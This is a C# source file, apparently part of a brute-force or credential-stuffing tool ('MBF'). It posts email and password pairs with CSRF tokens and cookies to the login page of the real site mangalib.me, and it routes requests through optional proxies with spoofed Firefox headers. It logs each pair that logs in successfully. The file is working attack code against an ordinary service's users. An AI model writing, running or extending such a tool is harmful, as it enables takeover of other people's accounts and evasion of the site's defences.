using MBF.Core.Config;
using MBF.Core.Modules;
using MBF.Properties;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Net;
using System.Net.Http;

namespace MBF.Core.Request
{
    /// <summary>
    /// Класс для отправки данных
    /// </summary>
    class PostPage
    {
        /// <summary>
        /// Url на который нужно делать запросы
        /// </summary>
        private readonly String RequestUrl = AppSettings.RequestUrl;

        /// <summary>
        /// Url на который нужно записывать куки
        /// </summary>
        private readonly String BaseUrl = AppSettings.BaseUrl;

        /// <summary>
        /// Прокси для запроса
        /// </summary>
        public WebProxy Proxy;

        /// <summary>
        /// Контент после отправки данных
        /// </summary>
        public string Content;

        /// <summary>
        /// Инициализация объекта
        /// </summary>
        /// <param name="login"></param>
        /// <param name="password"></param>
        /// <returns></returns>
        public PostPage Init(WebProxy proxy)
        {
            Proxy = (AppSettings.USE_PROXY) ? proxy : null;
            return this;
        }

        /// <summary>
        /// Инициализация объекта
        /// </summary>
        /// <returns></returns>
        public PostPage Init()
        {
            #if DEBUG
                Console.WriteLine(Resources.Log7, AppSettings.DefaultHost, AppSettings.DefaultPort.ToString(CultureInfo.CurrentCulture), AppSettings.USE_PROXY.ToString(CultureInfo.CurrentCulture));
            #endif
            Proxy = (AppSettings.USE_PROXY) ? new WebProxy(AppSettings.DefaultHost, AppSettings.DefaultPort) : null;
            return this;
        }


        public HttpResponseMessage GetContent(Dictionary<string, string> cookies, string _token, string login, string password)
        {
            var cookieContainer = new CookieContainer();
            using (var handler = new HttpClientHandler()
            {
                //AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate | DecompressionMethods.None,
                CookieContainer = cookieContainer,
                Proxy = Proxy
            })

            using (var client = new HttpClient(handler))
            {
                // установка заголовков
                client.DefaultRequestHeaders.Add("Connection", "keep-alive");
                client.DefaultRequestHeaders.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                client.DefaultRequestHeaders.Add("Accept-Encoding", "gzip, deflate, br");
                client.DefaultRequestHeaders.Add("Accept-Language", "am,uk;q=0.7,ru;q=0.3");
                client.DefaultRequestHeaders.Add("Host", "mangalib.me");
                client.DefaultRequestHeaders.Add("Referer", "https://mangalib.me/login");
                client.DefaultRequestHeaders.Add("TE", "Trailers");
                client.DefaultRequestHeaders.Add("Upgrade-Insecure-Requests", "1");
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0");

                // POST данные для отправки
                var postData = new FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string, string>("email", login),
                    new KeyValuePair<string, string>("password", password),
                    new KeyValuePair<string, string>("_token", _token)
                });

                #if DEBUG
                    Console.WriteLine(Resources.Log8, login, password, _token);
                #endif


                // Установка куки
                foreach (var obj in cookies)
                {
                    cookieContainer.Add(new Uri(BaseUrl), new Cookie(obj.Key, obj.Value));
                    #if DEBUG
                        Console.Write(Resources.Log9, obj.Key, obj.Value);
                    #endif
                }

                // запрос
                HttpResponseMessage response = client.PostAsync(new Uri(RequestUrl), postData).Result;

                TreatmentPostData treatment = new TreatmentPostData(response);

                if (treatment.Tests())
                {
                    Loger.AddSuccess(string.Format(CultureInfo.CurrentCulture, "{0}, {1}", login, password));
                    #if !DEBUG
                        Console.Write("Login: " + login + ";\tPassword: " + password + "\tStatus: OK");
                    #endif
                }
                Console.WriteLine("Login: " + login + ";\tPassword: " + password + "\tStatus: NOT");
                Loger.AddLog(string.Format(CultureInfo.CurrentCulture, "{0}, {1}", login, password));

                postData.Dispose();
                return response;
            }
        }
    }
}
